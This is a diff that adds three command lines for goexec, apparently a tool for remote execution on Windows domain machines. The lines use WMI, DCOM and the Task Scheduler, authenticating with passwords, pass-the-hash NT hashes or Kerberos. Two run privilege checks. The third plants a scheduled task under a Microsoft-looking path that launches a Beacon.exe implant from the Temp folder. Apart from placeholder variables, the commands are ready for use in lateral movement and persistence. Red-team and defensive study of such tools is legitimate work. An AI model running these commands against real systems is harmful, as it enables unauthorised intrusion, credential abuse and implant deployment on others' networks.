@@ -1,0 +1,3 @@
+goexec wmi proc "$TARGET" --dc "$IP" --user "$USER" --password "$PASSWORD" --exec cmd.exe --args '/c whoami /all' --output -
+goexec dcom mmc "$TARGET" --dc "$IP" --user "$USER" --nt-hash "$NT_HASH" --exec cmd.exe --args '/c whoami' --output result.txt
+goexec tsch create "$TARGET" --dc "$IP" --kerberos --user "$USER" --nt-hash "$NT_HASH" --task '\\Microsoft\\Windows\\GoExec' --exec C:\\Windows\\Temp\\Beacon.exe
